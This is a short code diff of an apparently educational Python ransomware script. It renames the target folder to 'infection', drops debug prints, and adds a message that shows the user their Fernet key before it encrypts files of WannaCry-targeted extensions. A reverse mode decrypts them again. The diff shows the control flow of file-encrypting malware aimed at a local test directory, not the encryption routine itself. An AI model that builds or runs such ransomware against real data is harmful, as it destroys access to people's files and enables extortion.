@@ -6,22 +6,21 @@ from wannacry_file_extensions import file_extensions
 
 
 def main():
-    dir = "super_important_data"
+    dir = "infection"
 
     args = parse_args()
-    print(args)
 
     if args["generate_test_files"]:
         generate_test_files(dir, file_extensions)
     else:
         key = args["reverse"] if args["reverse"] else Fernet.generate_key()
-        print(key)
 
         ransomware = Ransomware(dir, key, args["reverse"])
 
         if args["reverse"]:
             ransomware.dencrypt_files()
         else:
+            print(f"This is your key: {key} \nKeep it somewhere safe if you want to decrypt your files")
             ransomware.encrypt_files()
 
 class Ransomware():
